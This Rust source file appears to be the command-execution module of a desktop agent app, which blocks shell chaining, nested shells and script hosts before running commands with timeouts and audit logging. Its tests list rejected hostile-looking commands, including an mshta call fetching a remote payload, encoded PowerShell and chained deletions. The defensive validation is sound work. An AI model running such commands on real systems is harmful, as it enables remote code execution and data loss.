use std::io::Read;
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};

use std::time::{Duration, Instant, SystemTime};

use crate::desktop_command_supervisor::CommandExecution;

use crate::CommandResult;

const DEFAULT_COMMAND_TIMEOUT_MS: u64 = 120_000;

pub(crate) const MAX_COMMAND_TIMEOUT_MS: u64 = 10 * 60_000;

const MAX_COMMAND_OUTPUT_BYTES: u64 = 1024 * 1024;

fn read_command_output(path: &Path) -> (String, bool) {
    let Ok(file) = std::fs::File::open(path) else {
        return (String::new(), false);
    };
    let mut bytes = Vec::new();
    let mut limited = file.take(MAX_COMMAND_OUTPUT_BYTES + 1);
    let _ = limited.read_to_end(&mut bytes);
    let truncated = bytes.len() as u64 > MAX_COMMAND_OUTPUT_BYTES;
    if truncated {
        bytes.truncate(MAX_COMMAND_OUTPUT_BYTES as usize);
    }
    (decode_command_bytes(&bytes), truncated)
}

pub(crate) fn decode_command_bytes(bytes: &[u8]) -> String {
    if let Ok(value) = std::str::from_utf8(bytes) {
        return value.to_string();
    }
    #[cfg(target_os = "windows")]
    {
        let (decoded, _, _) = encoding_rs::GBK.decode(bytes);
        decoded.into_owned()
    }
    #[cfg(not(target_os = "windows"))]
    {
        String::from_utf8_lossy(bytes).into_owned()
    }
}

fn parse_command_executable(command: &str, host: &str) -> (String, String) {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return (String::new(), String::new());
    }
    let first = trimmed.chars().next().unwrap_or_default();
    if first == '"' || (host != "windows" && first == '\'') {
        if let Some(end) = trimmed[1..].find(first) {
            let executable = trimmed[1..end + 1].to_string();
            let remainder = trimmed[end + 2..].trim().to_string();
            return (executable, remainder);
        }
    }
    let split_at = trimmed.find(char::is_whitespace).unwrap_or(trimmed.len());
    (
        trimmed[..split_at].to_string(),
        trimmed[split_at..].trim().to_string(),
    )
}

fn shell_control_operator(command: &str, host: &str) -> Option<&'static str> {
    let chars: Vec<char> = command.chars().collect();
    let mut quote: Option<char> = None;
    let mut index = 0usize;
    while index < chars.len() {
        let current = chars[index];
        let next = chars.get(index + 1).copied().unwrap_or_default();
        if current == '\r' || current == '\n' {
            return Some("newline");
        }
        if host == "windows" && current == '^' && quote.is_none() {
            index += 2;
            continue;
        }
        if host != "windows" && current == '\\' && quote != Some('\'') {
            index += 2;
            continue;
        }
        // cmd.exe does not use apostrophes to quote shell control characters.
        if host != "windows" && current == '\'' && quote != Some('"') {
            quote = if quote == Some('\'') {
                None
            } else {
                Some('\'')
            };
            index += 1;
            continue;
        }
        if current == '"' && quote != Some('\'') {
            quote = if quote == Some('"') { None } else { Some('"') };
            index += 1;
            continue;
        }
        if quote != Some('\'') && (current == '`' || (current == '$' && next == '(')) {
            return Some(if current == '`' { "`" } else { "$(" });
        }
        if quote.is_none() {
            match current {
                '&' => return Some("&"),
                '|' => return Some("|"),
                ';' => return Some(";"),
                '<' => return Some("<"),
                '>' => return Some(">"),
                _ => {}
            }
        }
        index += 1;
    }
    None
}

fn validate_command_for_host(command: &str, host: &str) -> Result<(), String> {
    if command.trim().is_empty() {
        return Err("No command was provided.".to_string());
    }
    if let Some(operator) = shell_control_operator(command, host) {
        return Err(format!(
            "Raw shell control operator \"{}\" is not allowed. Use one structured command per tool call.",
            operator
        ));
    }
    let (executable, remainder) = parse_command_executable(command, host);
    let normalized = executable.replace('\\', "/").to_lowercase();
    let name = normalized
        .rsplit('/')
        .next()
        .unwrap_or(&normalized)
        .trim_end_matches(".exe");
    if host == "windows" {
        let nested_shell = matches!(
            name,
            "cmd" | "%comspec%" | "wscript" | "cscript" | "mshta" | "powershell" | "pwsh"
        );
        if nested_shell {
            return Err(format!(
                "Nested shell or script-host command \"{}\" is not allowed through the raw command adapter. Use a structured executable and argument list.",
                executable
            ));
        }
        if normalized.starts_with("/bin/") || matches!(name, "rm" | "sh" | "bash" | "zsh" | "sudo")
        {
            return Err(format!(
                "Command \"{}\" is a POSIX command and cannot run through the Windows command adapter.",
                executable
            ));
        }
        let find_path = remainder.trim();
        if name == "find"
            && (find_path == "/"
                || find_path.starts_with("/ ")
                || find_path == "~"
                || find_path.starts_with("~/")
                || find_path.starts_with("~\\")
                || find_path.starts_with("~ "))
        {
            return Err(
                "POSIX find path syntax is not supported on Windows. Use native desktop file tools."
                    .to_string(),
            );
        }
    } else if matches!(name, "cmd" | "findstr" | "taskmgr") {
        return Err(format!(
            "Command \"{}\" is Windows-specific and cannot run on {}.",
            executable, host
        ));
    }
    Ok(())
}

#[cfg(test)]
mod command_platform_validation_tests {
    use super::validate_command_for_host;

    #[test]
    fn shared_windows_quote_boundaries() {
        let cases: serde_json::Value = serde_json::from_str(include_str!(
            "../../test/fixtures/windows_command_boundaries.json"
        ))
        .unwrap();
        for case in cases.as_array().unwrap() {
            let command = case["command"].as_str().unwrap();
            assert_eq!(
                validate_command_for_host(command, "windows").is_ok(),
                case["windowsAccepted"].as_bool().unwrap(),
                "{}",
                command
            );
            assert_eq!(
                validate_command_for_host(command, "linux").is_ok(),
                case["posixAccepted"].as_bool().unwrap(),
                "{}",
                command
            );
        }
    }

    #[test]
    fn rejects_posix_commands_on_windows() {
        for command in ["find /", "find ~", "rm file.txt", "/bin/sh -c whoami"] {
            assert!(
                validate_command_for_host(command, "windows").is_err(),
                "{}",
                command
            );
        }
    }

    #[test]
    fn rejects_raw_shell_chaining_but_allows_quoted_text() {
        for command in [
            "echo ok & del file.txt",
            "whoami && dir",
            "echo ok | findstr ok",
        ] {
            assert!(
                validate_command_for_host(command, "windows").is_err(),
                "{}",
                command
            );
        }
        assert!(validate_command_for_host("echo \"a & b\"", "windows").is_ok());
        assert!(validate_command_for_host("whoami", "windows").is_ok());
    }

    #[test]
    fn rejects_nested_windows_shells_and_script_hosts() {
        for command in [
            "cmd.exe /c \"echo safe & whoami\"",
            "%COMSPEC% /c \"echo safe & whoami\"",
            "powershell.exe -NoProfile -Command \"Write-Output safe; whoami\"",
            "pwsh -EncodedCommand ZQBjAGgAbwAgAHMAYQBmAGUA",
            "powershell.exe -enc ZQBjAGgAbwAgAHMAYQBmAGUA",
            "powershell.exe -enco ZQBjAGgAbwAgAHMAYQBmAGUA",
            "powershell.exe /Command \"Write-Output safe; whoami\"",
            "pwsh.exe -CommandWithArgs \"Write-Output safe; whoami\"",
            "powershell.exe -File C:\\Temp\\job.ps1",
            "wscript.exe unsafe.vbs",
            "cscript unsafe.vbs",
            "mshta.exe https://example.invalid/payload.hta",
        ] {
            assert!(
                validate_command_for_host(command, "windows").is_err(),
                "{}",
                command
            );
        }
    }
}

fn terminate_command_tree(child: &mut Child) {
    #[cfg(target_os = "windows")]
    {
        let pid = child.id().to_string();
        let mut taskkill = Command::new("taskkill");
        taskkill.args(["/PID", &pid, "/T", "/F"]);
        taskkill.creation_flags(0x08000000u32);
        let _ = taskkill
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status();
    }
    #[cfg(not(target_os = "windows"))]
    {
        // run_command creates a separate process group so descendants are
        // included instead of leaving a shell's child running after cancel.
        let _ = Command::new("kill")
            .args(["-KILL", "--", &format!("-{}", child.id())])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status();
    }
    let _ = child.kill();
    let _ = child.wait();
}

pub(crate) fn run_command_blocking(
    command: String,
    cwd: Option<String>,
    timeout_ms: Option<u64>,
    execution: &CommandExecution,
) -> CommandResult {
    if execution.is_cancelled() {
        return CommandResult {
            success: false,
            output: "Command cancelled before native dispatch.".into(),
        };
    }
    let now = SystemTime::now();
    let truncated: String = if command.chars().count() > 500 {
        let head: String = command.chars().take(500).collect();
        format!("{}... (truncated, {} bytes total)", head, command.len())
    } else {
        command.clone()
    };
    if let Err(error) = validate_command_for_host(&command, std::env::consts::OS) {
        return CommandResult {
            success: false,
            output: error,
        };
    }
    let cwd_path = cwd
        .as_ref()
        .map(|value| value.trim())
        .filter(|value| !value.is_empty())
        .map(PathBuf::from);
    if let Some(path) = cwd_path.as_ref() {
        if !path.is_dir() {
            return CommandResult {
                success: false,
                output: format!("Working directory does not exist: {}", path.display()),
            };
        }
    }

    let timeout = Duration::from_millis(
        timeout_ms
            .unwrap_or(DEFAULT_COMMAND_TIMEOUT_MS)
            .clamp(1_000, MAX_COMMAND_TIMEOUT_MS),
    );
    let unique = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    let output_base =
        std::env::temp_dir().join(format!("lumi-command-{}-{}", std::process::id(), unique));
    let stdout_path = output_base.with_extension("stdout");
    let stderr_path = output_base.with_extension("stderr");
    let stdout_file = match std::fs::File::create(&stdout_path) {
        Ok(file) => file,
        Err(error) => {
            return CommandResult {
                success: false,
                output: error.to_string(),
            }
        }
    };
    let stderr_file = match std::fs::File::create(&stderr_path) {
        Ok(file) => file,
        Err(error) => {
            let _ = std::fs::remove_file(&stdout_path);
            return CommandResult {
                success: false,
                output: error.to_string(),
            };
        }
    };

    #[cfg(target_os = "windows")]
    let mut cmd = {
        let mut cmd = Command::new("cmd");
        cmd.args(["/D", "/S", "/C"]);
        cmd.raw_arg(&command);
        cmd.creation_flags(0x08000000u32);
        cmd
    };
    #[cfg(not(target_os = "windows"))]
    let mut cmd = {
        use std::os::unix::process::CommandExt;
        let mut cmd = Command::new("sh");
        cmd.args(["-c", &command]);
        cmd.process_group(0);
        cmd
    };
    if let Some(path) = cwd_path.as_ref() {
        cmd.current_dir(path);
    }
    cmd.stdin(Stdio::null())
        .stdout(Stdio::from(stdout_file))
        .stderr(Stdio::from(stderr_file));

    let result = match execution.dispatch(|| cmd.spawn()) {
        Some(Ok(mut child)) => {
            let deadline = Instant::now() + timeout;
            let mut timed_out = false;
            let mut cancelled = false;
            let status = loop {
                match child.try_wait() {
                    Ok(Some(status)) => break Ok(status),
                    Ok(None) if execution.is_cancelled() => {
                        cancelled = true;
                        terminate_command_tree(&mut child);
                        break child.try_wait().and_then(|status| {
                            status.ok_or_else(|| {
                                std::io::Error::other(
                                    "[outcome_unknown] Cancellation could not confirm process exit",
                                )
                            })
                        });
                    }
                    Ok(None) if Instant::now() < deadline => {
                        std::thread::sleep(Duration::from_millis(50))
                    }
                    Ok(None) => {
                        timed_out = true;
                        terminate_command_tree(&mut child);
                        break child.try_wait().and_then(|status| {
                            status.ok_or_else(|| {
                                std::io::Error::new(
                                    std::io::ErrorKind::TimedOut,
                                    "[outcome_unknown] Timed out but process exit was not confirmed",
                                )
                            })
                        });
                    }
                    Err(error) => {
                        terminate_command_tree(&mut child);
                        break Err(std::io::Error::other(format!(
                            "[outcome_unknown] Command exit could not be verified: {error}"
                        )));
                    }
                }
            };
            let (stdout, stdout_truncated) = read_command_output(&stdout_path);
            let (stderr, stderr_truncated) = read_command_output(&stderr_path);
            let mut combined = if stderr.is_empty() {
                stdout
            } else if stdout.is_empty() {
                stderr
            } else {
                format!("{}\n{}", stdout, stderr)
            };
            if stdout_truncated || stderr_truncated {
                combined.push_str("\n[Output truncated at 1 MiB per stream]");
            }
            if timed_out {
                combined.push_str(&format!(
                    "\n[Command timed out after {} ms and was terminated]",
                    timeout.as_millis()
                ));
            }
            if cancelled {
                combined.push_str("\n[Command cancelled; native process exit confirmed]");
            }
            status.map(|status| (status.success() && !timed_out && !cancelled, combined))
        }
        Some(Err(error)) => Err(error),
        None => Ok((false, "Command cancelled before native dispatch.".into())),
    };
    let _ = std::fs::remove_file(&stdout_path);
    let _ = std::fs::remove_file(&stderr_path);

    match result {
        Ok((success, output)) => {
            eprintln!(
                "[LumiCore Audit] ts={:?} ok={} cwd={} cmd={}",
                now,
                success,
                cwd_path
                    .as_ref()
                    .map(|p| p.to_string_lossy().to_string())
                    .unwrap_or_default(),
                truncated
            );
            CommandResult { success, output }
        }
        Err(e) => {
            eprintln!(
                "[LumiCore Audit] ts={:?} ok=false cmd={} err={}",
                now, truncated, e
            );
            CommandResult {
                success: false,
                output: e.to_string(),
            }
        }
    }
}
